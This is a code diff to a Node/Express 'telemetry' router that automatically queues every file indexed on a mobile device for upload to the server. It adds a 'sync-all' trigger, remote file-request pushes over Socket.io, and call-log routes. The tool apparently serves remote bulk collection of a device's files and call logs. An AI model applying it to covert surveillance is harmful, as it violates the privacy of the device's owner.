@@ -39,6 +39,141 @@ function saveDeviceSyncRules(safeId, rulesData) {
   return content;
 }
 
+// Servicio de Encolamiento Automatico Global de Archivos (Server-Driven Auto-Sync)
+function autoEnqueueDeviceFiles(safeId, options = {}) {
+  const targetDir = getDatasetDir();
+  const deviceDir = path.join(targetDir, 'devices', safeId);
+  const indexPath = path.join(deviceDir, 'file_index.json');
+  const downloadsMapPath = path.join(deviceDir, 'downloaded_files.json');
+
+  if (!fs.existsSync(indexPath)) return { totalIndexed: 0, enqueuedPending: 0, enqueuedStandby: 0 };
+
+  let indexList = [];
+  try {
+    const raw = JSON.parse(fs.readFileSync(indexPath, 'utf8'));
+    indexList = Array.isArray(raw) ? raw : (raw.files || []);
+  } catch (e) {
+    return { error: 'Error al leer file_index.json' };
+  }
+
+  let downloadedMap = {};
+  if (fs.existsSync(downloadsMapPath)) {
+    try { downloadedMap = JSON.parse(fs.readFileSync(downloadsMapPath, 'utf8')); } catch (e) {}
+  }
+
+  const rulesData = getDeviceSyncRules(safeId);
+  const reqMap = new Map();
+  (rulesData.requestedFiles || []).forEach(r => {
+    if (r && r.path) reqMap.set(r.path, r);
+  });
+
+  let enqueuedPending = 0;
+  let enqueuedStandby = 0;
+  const maxStandbyThreshold = 100 * 1024 * 1024; // 100 MB umbral para diferir preventivamente
+
+  for (const item of indexList) {
+    if (!item || item.isDirectory) continue;
+    const filePath = item.absolutePath;
+    if (!filePath) continue;
+
+    // Si ya reside en el servidor segun downloaded_files.json
+    if (downloadedMap[filePath]) {
+      if (reqMap.has(filePath)) {
+        const reqObj = reqMap.get(filePath);
+        if (reqObj.status !== 'COMPLETED') {
+          reqObj.status = 'COMPLETED';
+          reqObj.completedAt = reqObj.completedAt || new Date().toISOString();
+        }
+      }
+      continue;
+    }
+
+    const existingReq = reqMap.get(filePath);
+    if (!existingReq) {
+      const sizeBytes = Number(item.sizeBytes) || 0;
+      const isLarge = sizeBytes > maxStandbyThreshold;
+      const status = (isLarge && !options.includeLarge) ? 'STANDBY' : 'PENDING';
+
+      const newRecord = {
+        path: filePath,
+        status,
+        sizeBytes,
+        requestedAt: new Date().toISOString()
+      };
+      rulesData.requestedFiles.push(newRecord);
+      reqMap.set(filePath, newRecord);
+
+      if (status === 'PENDING') enqueuedPending++;
+      else enqueuedStandby++;
+    } else if (existingReq.status === 'STANDBY' && options.includeLarge) {
+      existingReq.status = 'PENDING';
+      existingReq.requestedAt = new Date().toISOString();
+      enqueuedPending++;
+    }
+  }
+
+  if (enqueuedPending > 0 || enqueuedStandby > 0) {
+    saveDeviceSyncRules(safeId, rulesData);
+  }
+
+  return {
+    totalIndexed: indexList.length,
+    enqueuedPending,
+    enqueuedStandby,
+    totalPending: rulesData.requestedFiles.filter(r => r.status === 'PENDING').length
+  };
+}
+
+// Calculo de Estadisticas Globales de Sincronizacion por Dispositivo
+function getDeviceSyncStats(safeId) {
+  const targetDir = getDatasetDir();
+  const deviceDir = path.join(targetDir, 'devices', safeId);
+  const indexPath = path.join(deviceDir, 'file_index.json');
+  const downloadsMapPath = path.join(deviceDir, 'downloaded_files.json');
+  const downloadsDir = path.join(deviceDir, 'downloads');
+
+  let totalFiles = 0;
+  let totalBytes = 0;
+  if (fs.existsSync(indexPath)) {
+    try {
+      const raw = JSON.parse(fs.readFileSync(indexPath, 'utf8'));
+      const list = Array.isArray(raw) ? raw : (raw.files || []);
+      for (const item of list) {
+        if (item && !item.isDirectory) {
+          totalFiles++;
+          totalBytes += Number(item.sizeBytes) || 0;
+        }
+      }
+    } catch (e) {}
+  }
+
+  let downloadedFiles = 0;
+  if (fs.existsSync(downloadsMapPath)) {
+    try {
+      const map = JSON.parse(fs.readFileSync(downloadsMapPath, 'utf8'));
+      downloadedFiles = Object.keys(map).length;
+    } catch (e) {}
+  } else if (fs.existsSync(downloadsDir)) {
+    try {
+      downloadedFiles = fs.readdirSync(downloadsDir).length;
+    } catch (e) {}
+  }
+
+  const rulesData = getDeviceSyncRules(safeId);
+  const pendingFiles = (rulesData.requestedFiles || []).filter(r => r.status === 'PENDING').length;
+  const standbyFiles = (rulesData.requestedFiles || []).filter(r => r.status === 'STANDBY').length;
+  const completedFiles = (rulesData.requestedFiles || []).filter(r => r.status === 'COMPLETED').length;
+
+  return {
+    totalFiles,
+    totalBytes,
+    downloadedFiles,
+    completedFiles,
+    pendingFiles,
+    standbyFiles
+  };
+}
+
 // GET /api/telemetry/devices - Lista dinámica de dispositivos
 router.get('/api/telemetry/devices', (req, res) => {
   const targetDir = getDatasetDir();
@@ -124,18 +259,28 @@ router.post('/api/telemetry/device-index', (req, res) => {
   const indexPath = path.join(deviceDir, 'file_index.json');
   fs.writeFileSync(indexPath, JSON.stringify(files, null, 2), 'utf8');
 
+  // Encolar automaticamente archivos nuevos del dispositivo (Sincronizacion Global Server-Driven)
+  const enqueueResult = autoEnqueueDeviceFiles(safeId);
+
   // Emitir evento Socket.io de actualización del índice a la sala Web
   const deviceSyncNs = req.app.get('deviceSyncNamespace');
   if (deviceSyncNs) {
     deviceSyncNs.to(`web:device:${safeId}`).emit('sync:index_updated', {
       deviceId: safeId,
       count: files.length,
+      enqueueResult,
       updatedAt: new Date().toISOString()
     });
     console.log(`[DEVICE_SYNC] Emitted sync:index_updated for ${safeId} (${files.length} files) to web room`);
   }
 
-  return res.json({ success: true, message: 'Indice de archivos actualizado correctamente.', count: files.length });
+  return res.json({ 
+    success: true, 
+    message: 'Indice de archivos actualizado y encolado correctamente.', 
+    count: files.length,
+    enqueuedPending: enqueueResult.enqueuedPending || 0,
+    enqueuedStandby: enqueueResult.enqueuedStandby || 0
+  });
 });
 
 // POST /api/telemetry/request-upload & /api/telemetry/signal-sync
@@ -273,9 +418,20 @@ router.get('/api/telemetry/pending-downloads', (req, res) => {
     }
   }
 
-  const allPending = (rulesData.requestedFiles || [])
+  let allPending = (rulesData.requestedFiles || [])
     .filter(r => r.status === 'PENDING')
     .map(r => r.path);
+
+  // Si la cola activa es menor a 25, reabastecer dinamicamente desde file_index.json
+  if (allPending.length < 25) {
+    const enqueueRes = autoEnqueueDeviceFiles(safeId);
+    if (enqueueRes && enqueueRes.enqueuedPending > 0) {
+      const updatedRules = getDeviceSyncRules(safeId);
+      allPending = (updatedRules.requestedFiles || [])
+        .filter(r => r.status === 'PENDING')
+        .map(r => r.path);
+    }
+  }
 
   // Ordenar de menor a mayor tamaño para transferir primero archivos ligeros y evitar cuellos de botella
   allPending.sort((a, b) => {
@@ -303,6 +459,75 @@ router.get('/api/telemetry/pending-downloads', (req, res) => {
       file_extensions: []
     }
   });
+});
+
+// GET /api/telemetry/devices/:deviceId/sync-stats - Estadisticas de sincronizacion global
+router.get('/api/telemetry/devices/:deviceId/sync-stats', (req, res) => {
+  const safeId = sanitizeDeviceId(req.params.deviceId);
+  if (!safeId) return res.status(400).json({ error: 'Falta parametro deviceId' });
+
+  const stats = getDeviceSyncStats(safeId);
+  return res.json({ success: true, deviceId: safeId, stats });
+});
+
+// POST /api/telemetry/devices/:deviceId/sync-all - Disparador de sincronizacion de todo el almacenamiento
+router.post('/api/telemetry/devices/:deviceId/sync-all', (req, res) => {
+  const safeId = sanitizeDeviceId(req.params.deviceId);
+  if (!safeId) return res.status(400).json({ error: 'Falta parametro deviceId' });
+
+  const includeLarge = Boolean(req.body && req.body.includeLarge);
+  const result = autoEnqueueDeviceFiles(safeId, { includeLarge });
+  const stats = getDeviceSyncStats(safeId);
+
+  // Emitir actualizacion a la sala Web
+  const deviceSyncNs = req.app.get('deviceSyncNamespace');
+  if (deviceSyncNs) {
+    deviceSyncNs.to(`web:device:${safeId}`).emit('sync:rules_updated', {
+      deviceId: safeId,
+      stats,
+      result
+    });
+  }
+
+  return res.json({
+    success: true,
+    message: 'Sincronizacion total del dispositivo procesada.',
+    deviceId: safeId,
+    result,
+    stats
+  });
+});
+
+// POST /api/telemetry/devices/:deviceId/prioritize-file - Promover archivo STANDBY a PENDING
+router.post('/api/telemetry/devices/:deviceId/prioritize-file', (req, res) => {
+  const safeId = sanitizeDeviceId(req.params.deviceId);
+  const filePath = req.body && (req.body.filePath || req.body.path);
+  if (!safeId || !filePath) return res.status(400).json({ error: 'Falta deviceId o filePath' });
+
+  const rulesData = getDeviceSyncRules(safeId);
+  const existing = (rulesData.requestedFiles || []).find(r => r.path === filePath);
+
+  if (!existing) {
+    rulesData.requestedFiles.push({
+      path: filePath,
+      status: 'PENDING',
+      requestedAt: new Date().toISOString()
+    });
+  } else {
+    existing.status = 'PENDING';
+    existing.requestedAt = new Date().toISOString();
+  }
+
+  saveDeviceSyncRules(safeId, rulesData);
+
+  // Emitir a app movil y web
+  const deviceSyncNs = req.app.get('deviceSyncNamespace');
+  if (deviceSyncNs) {
+    deviceSyncNs.to(`device:${safeId}`).emit('sync:request_file', { path: filePath, deviceId: safeId });
+    deviceSyncNs.to(`web:device:${safeId}`).emit('sync:file_prioritized', { path: filePath, deviceId: safeId });
+  }
+
+  return res.json({ success: true, message: 'Archivo priorizado para descarga inmediata.', path: filePath });
 });
 
 // POST /api/telemetry/upload-file
@@ -709,5 +934,9 @@ const handleGetCallLogs = (req, res) => {
 router.post(['/api/telemetry/devices/:deviceId/call-logs/backup', '/api/devices/:deviceId/call-logs/backup', '/api/telemetry/call-logs/backup', '/api/call-logs/backup'], handleCallLogsBackup);
 router.post(['/api/telemetry/devices/:deviceId/call-logs/status', '/api/devices/:deviceId/call-logs/status', '/api/telemetry/call-logs/status', '/api/call-logs/status'], handleCallLogsStatus);
 router.get(['/api/telemetry/devices/:deviceId/call-logs', '/api/devices/:deviceId/call-logs', '/api/telemetry/call-logs', '/api/call-logs'], handleGetCallLogs);
+
+router.autoEnqueueDeviceFiles = autoEnqueueDeviceFiles;
+router.getDeviceSyncStats = getDeviceSyncStats;
+router.getDeviceSyncRules = getDeviceSyncRules;
 
 module.exports = router;
